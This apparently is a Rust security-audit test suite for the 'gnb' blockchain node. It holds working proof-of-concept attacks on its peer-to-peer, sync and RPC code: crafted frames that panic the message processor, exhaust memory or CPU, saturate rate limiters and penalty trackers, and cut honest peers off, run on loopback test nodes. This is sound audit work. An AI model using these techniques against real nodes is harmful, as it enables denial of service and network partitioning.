//! AUDIT PoC (network/sync/RPC reviewer). Each test DEMONSTRATES a finding;
//! a passing test means the weakness is present in the current code.
//!
//! Run: cargo test --release --locked -p gnb --test audit_poc_net -- --nocapture --test-threads=1

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use gnb::consensus::GhostDAG;
use gnb::core::{Block, BlockHeader, Transaction, TxInput, TxOutput};
use gnb::network::sync_rr::{select_pull_peer, PeerSync, SyncRequestLimiter};
use gnb::network::{
    decode_wire_message, NetworkConfig, NetworkMessage, NetworkNode, WirePenaltyTracker,
    WireReaction, MAX_WIRE_BYTES, MAX_WIRE_USER_AGENT_LEN, WIRE_PENALTY_TRACK_CAP,
};
use gnb::sync::frontier::FrontierState;
use gnb::sync::peer_state::PeerStateTable;
use libp2p::PeerId;
use parking_lot::RwLock;
use tokio::sync::mpsc;

const GENESIS: [u8; 32] = [0xCA; 32];

fn enc(m: &NetworkMessage) -> Vec<u8> {
    bincode::serde::encode_to_vec(m, bincode::config::standard()).unwrap()
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-A: gossip decode accepts trailing bytes → payload-free request frames
// (PeerRequest / GetTips / VersionAck) can be made byte-unique, defeating the
// gossipsub content-hash dedup that is the only thing bounding their
// broadcast-reply amplification.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_gossip_decode_accepts_trailing_garbage() {
    for base in [NetworkMessage::PeerRequest, NetworkMessage::GetTips] {
        let clean = enc(&base);
        let mut ids = std::collections::HashSet::new();
        for i in 0u32..100 {
            let mut f = clean.clone();
            f.extend_from_slice(&i.to_le_bytes()); // unique suffix
            let r = decode_wire_message(&f);
            assert!(
                matches!(r, Ok(NetworkMessage::PeerRequest) | Ok(NetworkMessage::GetTips)),
                "trailing bytes must be rejected, got {:?}",
                r.map(|m| m.kind_name())
            );
            use sha2::Digest;
            ids.insert(sha2::Sha256::digest(&f)[..16].to_vec());
        }
        println!("[NET-A] {}: 100 distinct gossip MessageIds all decoded as the same request", base.kind_name());
        assert_eq!(ids.len(), 100);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-B: an invalid-PoW NewBlock is ACCEPTED by the wire layer (no penalty)
// and costs the receiver a full GnB-SMH evaluation in validate_structure.
// The attacker pays nothing (random nonce, no hashing).
// ─────────────────────────────────────────────────────────────────────────────
fn coinbase(tag: u64, n_big_outputs: usize) -> Transaction {
    let mut outputs = vec![TxOutput { value: 1, script_pubkey: vec![1u8; 20] }];
    for _ in 0..n_big_outputs {
        outputs.push(TxOutput { value: 0, script_pubkey: vec![0xAB; 10_000] });
    }
    Transaction {
        version: 1,
        inputs: vec![TxInput {
            prev_txid: [0u8; 32],
            prev_index: u32::MAX,
            script_sig: format!("poc:{tag}").into_bytes(),
            sequence: u32::MAX,
        }],
        outputs,
        locktime: 0,
    }
}

fn block_with(parents: Vec<[u8; 32]>, bits: u32, nonce: u64, tag: u64, big: usize) -> Block {
    let txs = vec![coinbase(tag, big)];
    let mut b = Block {
        header: BlockHeader {
            version: 1,
            parents,
            merkle_root: Transaction::merkle_root(&txs),
            timestamp: 1_800_000_000,
            bits,
            nonce,
        },
        transactions: txs,
        blue_score: 1,
        height: 1,
        shielded_transactions: vec![],
    };
    b.header.merkle_root = b.body_merkle_root();
    b
}

#[test]
fn poc_invalid_pow_newblock_is_free_for_attacker_expensive_for_victim() {
    let mut tracker = WirePenaltyTracker::new();
    let peer = PeerId::random();
    let mut total = Duration::ZERO;
    const N: u64 = 5;
    for i in 0..N {
        // Hard target (genesis bits), random nonce: PoW fails AFTER a full evaluation.
        let blk = block_with(vec![[0x11; 32]], gnb::core::GENESIS_BITS, 0xDEAD_0000 + i, i, 0);
        let frame = enc(&NetworkMessage::NewBlock {
            block_hash: blk.block_hash(),
            blue_score: 1,
            height: 1,
            block_data: blk.to_wire_bytes(),
        });
        // Wire layer: accepted, no penalty.
        let msg = match tracker.classify(peer, &frame) {
            WireReaction::Accept(m) => m,
            other => panic!("expected Accept, got {:?}", other),
        };
        // Processor path (main.rs NewBlock arm): from_wire_bytes → id/height
        // binding (attacker-consistent) → validate_structure (PoW last).
        let NetworkMessage::NewBlock { block_data, .. } = msg else { unreachable!() };
        let b = Block::from_wire_bytes(&block_data).unwrap();
        let t0 = Instant::now();
        let r = b.validate_structure();
        total += t0.elapsed();
        assert_eq!(r, Err("invalid PoW"));
    }
    assert_eq!(tracker.score_of(&peer), None, "no penalty is ever applied for invalid PoW");
    println!(
        "[NET-B] {} invalid-PoW blocks: victim spent {:?} total ({:?}/block) in validate_structure; attacker spent ~0; peer score untouched",
        N, total, total / N as u32
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-0: main.rs NewBlock arm, backfill-flood guard (main.rs:1118-1121):
//     if !awaited && tip_h > CHECKPOINT_DEPTH && height + CHECKPOINT_DEPTH < tip_h
// `height` is attacker-chosen wire metadata (not PoW-committed); every check
// BEFORE this line is attacker-satisfiable at zero cost (no PoW is verified
// yet). With overflow-checks = true (workspace [profile.release]) the add
// panics; the supervisor catches it and sleeps with a backoff that is never
// reset (100 ms doubling to 30 s), while the 1000-slot ingest channel drops
// every other frame.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_height_overflow_panics_message_processor_guard() {
    let mut blk = block_with(vec![[0x33; 32]], gnb::core::GENESIS_BITS, 7, 7, 0);
    blk.height = u64::MAX; // wire metadata, not covered by block_hash()/PoW
    let frame = enc(&NetworkMessage::NewBlock {
        block_hash: blk.block_hash(),
        blue_score: 0,
        height: u64::MAX,
        block_data: blk.to_wire_bytes(),
    });
    // network layer: accepted, forwarded to the processor
    let NetworkMessage::NewBlock { block_hash, height, block_data, .. } =
        decode_wire_message(&frame).expect("wire accept")
    else {
        unreachable!()
    };
    // processor pre-checks (main.rs:1057-1079) all pass
    let b = Block::from_wire_bytes(&block_data).expect("block decodes");
    assert_eq!(b.block_hash(), block_hash, "id binding passes");
    assert_eq!(b.height, height, "height binding passes");
    // the guard expression, verbatim, with a mainnet-like tip
    let tip_h: u64 = 40_000;
    let awaited = false;
    let r = std::panic::catch_unwind(|| {
        let height = std::hint::black_box(height);
        !awaited
            && tip_h > gnb::core::CHECKPOINT_DEPTH
            && height + gnb::core::CHECKPOINT_DEPTH < tip_h
    });
    assert!(r.is_err(), "overflow must panic under this build's overflow-checks");
    println!("[NET-0] NewBlock{{height: u64::MAX}} passes every pre-check and panics the guard (no PoW work needed)");
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-C: orphan pool admission. A ~1 MB block with FAKE parents and
// self-declared bits = POW_LIMIT_BITS passes validate_structure after ~1
// evaluation; main.rs then buffers (Block + raw bytes) in a 10,000-entry
// orphan pool, i.e. ~2 MB × 10,000 ≈ 20 GB per node.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_orphan_with_fake_parents_and_pow_limit_bits_passes_structure() {
    let mut attempts = 0u64;
    let mut nonce = 0u64;
    let blk = loop {
        attempts += 1;
        let b = block_with(
            vec![[0x77; 32], [0x78; 32]], // parents that do not exist anywhere
            gnb::core::POW_LIMIT_BITS,
            nonce,
            42,
            95, // 95 × 10 KB coinbase outputs ≈ 950 KB
        );
        if b.validate_structure().is_ok() {
            break b;
        }
        nonce += 1;
        assert!(attempts < 50, "pow-limit target should pass almost always");
    };
    let raw = blk.to_wire_bytes();
    assert!(raw.len() > 900_000 && blk.size_bytes() <= gnb::core::MAX_BLOCK_SIZE);
    let frame = enc(&NetworkMessage::NewBlock {
        block_hash: blk.block_hash(),
        blue_score: 1,
        height: 1,
        block_data: raw.clone(),
    });
    assert!(frame.len() < MAX_WIRE_BYTES);
    assert!(matches!(decode_wire_message(&frame), Ok(NetworkMessage::NewBlock { .. })));
    println!(
        "[NET-C] orphan of {} wire bytes with fake parents passed validate_structure after {} GnB-SMH evaluation(s); \
         main.rs MAX_ORPHANS=10_000 keeps (Block, raw) per entry ⇒ ~{} GB retained per node",
        raw.len(),
        attempts,
        (raw.len() as u64 * 2 * 10_000) / 1_000_000_000
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-D: SyncRequestLimiter never evicts. After 1024 distinct PeerIds (free to
// mint) have made ONE request each, every NEW peer is refused forever.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_sync_limiter_permanent_lockout_of_new_peers() {
    let mut lim = SyncRequestLimiter::new();
    for _ in 0..1024 {
        assert!(lim.allow(PeerId::random()));
    }
    std::thread::sleep(Duration::from_millis(1500)); // time does not help: no expiry
    let honest_newcomer = PeerId::random();
    for _ in 0..10 {
        assert!(!lim.allow(honest_newcomer), "new honest peer must be served");
    }
    println!("[NET-D] after 1024 sybil ids, a fresh honest peer is refused (no eviction API, no TTL)");
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-E: WirePenaltyTracker never evicts; once 1024 identities are tracked,
// any later offender can violate forever without ever accumulating past -100.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_penalty_tracker_saturation_makes_new_offenders_unpunishable() {
    let mut t = WirePenaltyTracker::new();
    let bad = vec![0u8; MAX_WIRE_BYTES + 1];
    for _ in 0..WIRE_PENALTY_TRACK_CAP {
        t.classify(PeerId::random(), &bad);
    }
    let offender = PeerId::random();
    let mut worst = 0.0f64;
    for _ in 0..1000 {
        if let WireReaction::Penalize { score, .. } = t.classify(offender, &bad) {
            worst = worst.min(score);
        }
    }
    assert_eq!(worst, -100.0, "1000 violations never cross graylist (-400)");
    println!("[NET-E] 1000 violations after saturation → score stays {worst} (graylist needs < -400)");
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-F: directed-pull peer selection is captured by any peer that claims
// archival in its identify agent string and announces a high blue_score.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_pull_peer_selection_captured_by_self_declared_archival() {
    let honest_archival = PeerId::random();
    let attacker = PeerId::random();
    let mut peers = std::collections::HashMap::new();
    let ours = 50_000u64;
    peers.insert(honest_archival, PeerSync { blue_score: ours + 10, archival: Some(true) });
    // attacker: agent "gnb/x/a" (parse_archival_agent → Some(true)) + clamped score
    assert_eq!(gnb::network::sync_rr::parse_archival_agent("gnb/0.0.0/a"), Some(true));
    peers.insert(attacker, PeerSync { blue_score: ours + 1_000_000, archival: Some(true) });
    let explicit = std::collections::HashSet::from([honest_archival]);
    for _ in 0..1000 {
        assert_eq!(select_pull_peer(&peers, &explicit), Some(attacker));
    }
    println!("[NET-F] every GetBlock/GetHeaders/GetTips pull goes to the attacker; nothing demotes it");
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-G: FrontierState grows without bound from unsolicited Tips frames
// (each fake hash → in_flight entry + a GetBlock; later → abandoned set).
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_frontier_state_unbounded_from_fake_tips() {
    let mut fr = FrontierState::new();
    let now = Instant::now();
    let mut getblocks = 0usize;
    for frame in 0u32..2000 {
        let tips: Vec<[u8; 32]> = (0u32..256)
            .map(|i| {
                let mut h = [0u8; 32];
                h[..4].copy_from_slice(&frame.to_le_bytes());
                h[4..8].copy_from_slice(&i.to_le_bytes());
                h
            })
            .collect();
        getblocks += fr.to_request(&tips, |_| false, now).len();
    }
    assert_eq!(fr.outstanding(), 2000 * 256);
    println!(
        "[NET-G] 2000 Tips frames → {} in-flight entries and {} GetBlock pulls issued; no cap; IBD latch held (outstanding>0)",
        fr.outstanding(),
        getblocks
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// NET-H: RPC method name (attacker-chosen, ~1 MiB body) becomes a permanent
// Prometheus label value on EVERY path, including forbidden/rate_limited.
// ─────────────────────────────────────────────────────────────────────────────
#[test]
fn poc_metrics_label_cardinality_from_rpc_method() {
    let s = Arc::new(gnb::metrics::MetricsState::new("poc", "mainnet"));
    gnb::metrics::install(s.clone());
    for i in 0..2000 {
        let m = format!("{}{}", "x".repeat(4096), i);
        gnb::metrics::inc_rpc_request(&m, "rate_limited");
    }
    let fam = s.registry.gather();
    let rpc = fam.iter().find(|f| f.name() == "gnb_rpc_requests_total").unwrap();
    assert_eq!(rpc.get_metric().len(), 2000);
    println!("[NET-H] 2000 distinct 4 KiB method names → 2000 permanent series (~8 MiB) in the registry");
}

// ─────────────────────────────────────────────────────────────────────────────
// Live 3-node harness (real NetworkNode::run on loopback):  A ─ B ─ C
// ─────────────────────────────────────────────────────────────────────────────
struct Harness {
    peer_id: PeerId,
    addr: libp2p::Multiaddr,
    dag: Arc<RwLock<GhostDAG>>,
    outbound_tx: mpsc::Sender<NetworkMessage>,
    peer_state: Arc<PeerStateTable>,
    _dir: tempfile::TempDir,
}

fn full_addr(h: &Harness) -> String {
    format!("{}/p2p/{}", h.addr, h.peer_id)
}

#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct SimPayload {
    hash: [u8; 32],
    parents: Vec<[u8; 32]>,
    timestamp: u64,
    work: u128,
}

async fn spawn_node(bootstrap_peers: Vec<String>) -> Harness {
    let dir = tempfile::tempdir().expect("tempdir");
    let cfg = NetworkConfig {
        listen_addr: "/ip4/127.0.0.1/tcp/0".into(),
        bootstrap_peers,
        dns_seeds: vec![],
        max_peers: 8,
        data_dir: dir.path().to_path_buf(),
        allow_private_peers: true,
        behind_proxy: true,
        enable_mdns: false,
        archive: false,
    };
    let node = NetworkNode::new(cfg).expect("NetworkNode::new");
    let peer_id = node.peer_id;
    let dag = Arc::new(RwLock::new(GhostDAG::with_k(3)));
    dag.write().add_genesis(GENESIS, 0);
    let peer_state = Arc::new(PeerStateTable::new());
    let store = Arc::new(gnb::storage::Storage::open(&dir.path().join("db")).expect("store"));
    let (block_tx, mut block_rx) = mpsc::channel::<NetworkMessage>(1024);
    let (outbound_tx, outbound_rx) = mpsc::channel::<NetworkMessage>(1024);
    let (addr_tx, mut addr_rx) = mpsc::unbounded_channel::<libp2p::Multiaddr>();
    {
        let (dag, ps, store) = (dag.clone(), peer_state.clone(), store.clone());
        tokio::spawn(async move {
            let _ = node.run(block_tx, outbound_rx, dag, ps, store, Some(addr_tx)).await;
        });
    }
    {
        let dag = dag.clone();
        let seen = Arc::new(AtomicU64::new(0));
        tokio::spawn(async move {
            while let Some(msg) = block_rx.recv().await {
                seen.fetch_add(1, Ordering::Relaxed);
                if let NetworkMessage::NewBlock { block_data, .. } = msg {
                    if let Ok((p, _)) = bincode::serde::decode_from_slice::<SimPayload, _>(
                        &block_data,
                        bincode::config::standard(),
                    ) {
                        let mut d = dag.write();
                        if !d.has_block(&p.hash) && p.parents.iter().all(|h| d.has_block(h)) {
                            let _ = d.add_block(p.hash, p.parents.clone(), p.timestamp, p.work);
                        }
                    }
                }
            }
        });
    }
    let addr = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            let a = addr_rx.recv().await.expect("listen_report closed");
            let s = a.to_string();
            if s.starts_with("/ip4/127.0.0.1/tcp/") && !s.contains("/ws") {
                return a;
            }
        }
    })
    .await
    .expect("listen addr");
    Harness { peer_id, addr, dag, outbound_tx, peer_state, _dir: dir }
}

async fn publish_block(h: &Harness, hash: [u8; 32], parent: [u8; 32], ts: u64) {
    let p = SimPayload { hash, parents: vec![parent], timestamp: ts, work: 1 };
    h.outbound_tx
        .send(NetworkMessage::NewBlock {
            block_hash: hash,
            block_data: bincode::serde::encode_to_vec(&p, bincode::config::standard()).unwrap(),
            height: ts,
            blue_score: ts,
        })
        .await
        .unwrap();
}

async fn arrives(h: &Harness, hash: [u8; 32], secs: u64) -> bool {
    tokio::time::timeout(Duration::from_secs(secs), async {
        loop {
            if h.dag.read().has_block(&hash) {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(250)).await;
        }
    })
    .await
    .unwrap_or(false)
}

/// NET-I (live): gossipsub auto-forwards (no `validate_messages()`), and the
/// wire penalty is charged to `propagation_source` — the RELAYER. Topology:
/// A, C, D each connected ONLY to hub B. Bounds-violating frames from
/// attacker A are relayed by honest B; honest C charges them to B (observed:
/// -200 after 2 frames), prunes B from its mesh and drops B's IHAVE gossip
/// (score < gossip_threshold -100). Blocks originated by honest D and relayed
/// by honest B then never reach honest C. App score never decays.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn poc_live_relayed_violations_cut_honest_relay_path() {
    let _ = env_logger::builder().is_test(true).filter_level(log::LevelFilter::Warn)
        .filter_module("libp2p_gossipsub", log::LevelFilter::Error).try_init();
    let b = spawn_node(vec![]).await;
    let c = spawn_node(vec![full_addr(&b)]).await;
    let d = spawn_node(vec![full_addr(&b)]).await;
    let a = spawn_node(vec![full_addr(&b)]).await;
    println!("[NET-I] ids: A={} B={} C={} D={}", a.peer_id, b.peer_id, c.peer_id, d.peer_id);
    tokio::time::sleep(Duration::from_secs(12)).await;

    // Control: honest D → B → honest C works.
    publish_block(&d, [0xD1; 32], GENESIS, 1).await;
    assert!(arrives(&c, [0xD1; 32], 20).await, "control: D's block must reach C via B");

    // Attacker A: 5 byte-distinct Version frames with an over-long user_agent.
    for i in 0..5u8 {
        a.outbound_tx
            .send(NetworkMessage::Version {
                version: 1,
                user_agent: format!("{}{}", "z".repeat(MAX_WIRE_USER_AGENT_LEN + 1), i),
                blue_score: 0,
                height: 0,
                timestamp: i as u64,
            })
            .await
            .unwrap();
        tokio::time::sleep(Duration::from_millis(700)).await;
    }
    tokio::time::sleep(Duration::from_secs(5)).await;

    // Honest D publishes again; B receives it, but C no longer gets B's relays.
    publish_block(&d, [0xD2; 32], [0xD1; 32], 2).await;
    let at_b = arrives(&b, [0xD2; 32], 20).await;
    let at_c = arrives(&c, [0xD2; 32], 30).await;
    let b_c_connected = c.peer_state.snapshot().iter().any(|(p, s)| *p == b.peer_id && s.connected);
    println!(
        "[NET-I] after A's frames: D's block at B = {at_b}; relayed to C = {at_c}; B–C still connected = {b_c_connected}"
    );
    assert!(at_b, "network itself works: B received D's block");
    assert!(!at_c, "honest C cut off from honest relay B by A's relayed frames");
}

/// NET-K (unit): when a /gnb/sync/1 server declines to answer (rate limiter
/// drops the ResponseChannel → libp2p closes the stream gracefully), the
/// requester's codec reads an EMPTY frame, which decodes as InvalidData and is
/// classified as a deliberate protocol violation.
#[test]
fn poc_empty_response_is_classified_as_protocol_violation() {
    use gnb::network::sync_rr::{decode_response, is_sync_protocol_violation};
    let e = decode_response(&[]).expect_err("empty response must not decode");
    assert!(is_sync_protocol_violation(&e), "kind = {:?}", e.kind());
    println!("[NET-K] empty (server-declined) response → {:?} → penalized as wire violation", e.kind());
}

/// NET-K (live): an honest node X that issues an ordinary IBD-sized burst of
/// directed GetBlock pulls to honest peer Y exceeds Y's SyncRequestLimiter
/// (burst 64, 8/s); every declined request is charged to Y as a wire
/// violation on X, X graylists Y, and Y's blocks stop reaching X.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn poc_live_rate_limited_honest_server_gets_graylisted_by_requester() {
    let y = spawn_node(vec![]).await;
    let x = spawn_node(vec![full_addr(&y)]).await;
    tokio::time::sleep(Duration::from_secs(12)).await;

    publish_block(&y, [0xC1; 32], GENESIS, 1).await;
    assert!(arrives(&x, [0xC1; 32], 20).await, "control: Y's block must reach X");

    // 200 GetBlock pulls (an IBD node asks for up to 500 per Headers batch).
    for i in 0u32..200 {
        let mut h = [0x5Au8; 32];
        h[..4].copy_from_slice(&i.to_le_bytes());
        x.outbound_tx
            .send(NetworkMessage::GetBlock { block_hash: h, nonce: i as u64 })
            .await
            .unwrap();
    }
    tokio::time::sleep(Duration::from_secs(8)).await;

    publish_block(&y, [0xC2; 32], [0xC1; 32], 2).await;
    let ok = arrives(&x, [0xC2; 32], 25).await;
    println!("[NET-K] after a 200-pull burst, honest Y's next block reaches X = {ok}");
    assert!(!ok, "X graylisted honest Y for rate-limiting X's own requests");
}

/// NET-J (live): one gossip Version{blue_score: u64::MAX} from A is relayed by
/// B and recorded in C's peer_state AGAINST B (relayer attribution), clamped
/// only to our_score + 1,000,000, and never lowered (monotonic max). The IBD
/// "caught_up" release predicate (our + IBD_EXIT_LAG >= best_announced) can
/// then never hold while B stays connected.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn poc_live_relayed_tip_inflation_latches_ibd() {
    let b = spawn_node(vec![]).await;
    let c = spawn_node(vec![full_addr(&b)]).await;
    let a = spawn_node(vec![full_addr(&b)]).await;
    tokio::time::sleep(Duration::from_secs(12)).await;

    a.outbound_tx
        .send(NetworkMessage::Version {
            version: 1,
            user_agent: "gnb/poc".into(),
            blue_score: u64::MAX,
            height: u64::MAX,
            timestamp: 12345,
        })
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_secs(4)).await;
    // B keeps announcing its honest (low) score afterwards.
    for i in 0..3u64 {
        b.outbound_tx
            .send(NetworkMessage::Version {
                version: 1,
                user_agent: "gnb/honest".into(),
                blue_score: 0,
                height: 1,
                timestamp: 99_000 + i,
            })
            .await
            .unwrap();
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    tokio::time::sleep(Duration::from_secs(3)).await;

    let our = c.dag.read().tip_blue_score();
    let snap = c.peer_state.snapshot();
    let b_row = snap.iter().find(|(p, _)| *p == b.peer_id).map(|(_, s)| s.announced_blue_score);
    let a_row = snap.iter().any(|(p, _)| *p == a.peer_id);
    let best = c.peer_state.best_announced_blue_score();
    let caught_up = our.saturating_add(gnb::sync::IBD_EXIT_LAG) >= best;
    println!(
        "[NET-J] C: our={our} best_announced={best} B's row={b_row:?} A known to C={a_row} caught_up={caught_up}"
    );
    assert_eq!(b_row, Some(our + 1_000_000), "A's lie is attributed to honest relay B");
    assert!(!a_row, "C never even sees A as a peer");
    assert!(!caught_up, "caught_up release can never fire");
}
